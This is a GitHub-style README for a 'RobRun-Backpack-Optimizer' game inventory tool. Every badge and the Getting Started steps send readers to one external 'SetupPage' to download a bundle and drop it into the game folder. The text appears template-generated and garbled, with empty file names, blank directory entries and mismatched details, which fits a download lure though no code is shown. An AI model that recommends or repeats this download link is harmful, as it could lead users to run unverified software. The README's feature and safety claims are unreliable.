# RobRun-Backpack-Optimizer

<div align="center">
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/Download-Release-b45309?style=plastic&logo=typescript&logoColor=white" alt="Download">
  </a>
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/Version-1.2.3-blue?style=for-the-badge&logo=git&logoColor=white" alt="Version">
  </a>
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/License-MIT-green?style=flat-square&logo=open-source-initiative&logoColor=white" alt="License">
  </a>
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/Language-English-ff69b4?style=flat&logo=python&logoColor=white" alt="Language">
  </a>
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/Build-Ready-ff851b?style=plastic&logo=jenkins&logoColor=white" alt="Build">
  </a>
</div>

---

## What RobRun-Backpack-Optimizer Delivers

RobRun-Backpack-Optimizer transforms the way you manage inventory in RobRun.
- **3× faster Release time** for daily missions.
- **Intuitive presets** that adapt to your playstyle.
- **Zero configuration friction** – drop the bundle into the game directory and start optimizing instantly.

With a focus on structured profiles and workflow presets, this companion makes every inventory adjustment a click away.

---

### How to Edit

1. Open the configuration folder located at `C:\RobRun\Configs\`.
2. Use any plain‑text editor; the syntax is key‑value pairs separated by `=`.
3. Save and reload the game. The Optimizer reads the files on launch, merging them in the order shown above.

---

## Workflow Presets

RobRun‑Backpack‑Optimizer ships with five ready‑to‑use presets that cover common scenarios:

| Preset | Use‑case | Core Tweaks |
|--------|----------|-------------|
| **Standard** | Everyday play | Balanced weight, auto‑sort enabled |
| **Hardcore** | High‑risk missions | Max weight cap, priority weapons first |
| **Collector** | Item farming | Auto‑stack disabled, rare items flagged |
| **Speed‑run** | Fast progression | Grid set to 8x4, quick‑swap shortcuts |
| **Custom** | User‑defined | Load `` for full control |

Applying a preset is as simple as selecting it from the in‑game menu; the Optimizer rewrites the active configuration files automatically.

---

## Directory Layout

```
RobRun-Backpack-Optimizer/
├─ configs/
│  ├─
│  ├─
│  ├─
│  └─
├─ presets/
│  ├─ standard.json
│  ├─ hardcore.json
│  ├─ collector.json
│  ├─ speedrun.json
│  └─ custom.json
├─ README.md
└─ assets/
   └─ icons/
      ├─ backpack.png
      └─ gear.png
```

The `configs` folder contains all editable files; `presets` holds the JSON definitions that drive the preset application logic.

---

## Getting Started

1. **Download** the latest release bundle via the button above.
2. Extract the archive and place the `RobRun-Backpack-Optimizer` folder in the same directory as the main game executable.
3. Launch RobRun. The Optimizer will automatically load the default configuration.
4. Use the in‑game menu (accessed by pressing **B**) to switch presets or tweak settings.
5. When satisfied, your custom configuration will be stored in ``, ensuring it persists across updates.

---

## FAQ

**Q: Does RobRun‑Backpack‑Optimizer require a particular game version?**
A: Compatibility starts at version 2.0.0 and newer. Older releases may not recognize new configuration keys.

**Q: Can I share my custom presets with friends?**
A: Absolutely. Copy the entire `presets` folder or individual JSON files and place them in the same location on another machine.

**Q: My backpack still looks cluttered after applying a preset.**
A: Check the `auto_sort` flag in ``. Setting it to `false` allows manual arrangement while still benefiting from weight capping.

**Q: Is the optimizer safe to use with the official game server?**
A: Yes. It only modifies local configuration files and does not alter game binaries or network traffic.

---

## Troubleshooting

| Symptom | Likely Cause | Fix |
|---------|--------------|-----|
| Preset selection menu missing | Optimizer not loaded | Verify the folder is in the game directory and the game is restarted. |
| Items not moving to designated slots | `auto_sort` disabled | Set `auto_sort=true` in `` or the active preset JSON. |
| Weight limit appears lower than set | Conflicting `max_weight` entries | Ensure `max_weight` appears only in one file; `` overrides others. |
| Game crashes after Optimizer launch | Corrupted configuration file | Replace the problematic file with a fresh copy from the repository. |

---

## Community & Support

For feature requests, bug reports, or to share your own preset, open an issue on the GitHub repository.
Follow @TigerProxy78 on Twitter for quick updates and tips.

---

## Legal

RobRun‑Backpack‑Optimizer is released under the MIT License.
All assets in the `assets` folder are licensed for personal use and redistribution within the scope of the Optimizer’s functionality.

---

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```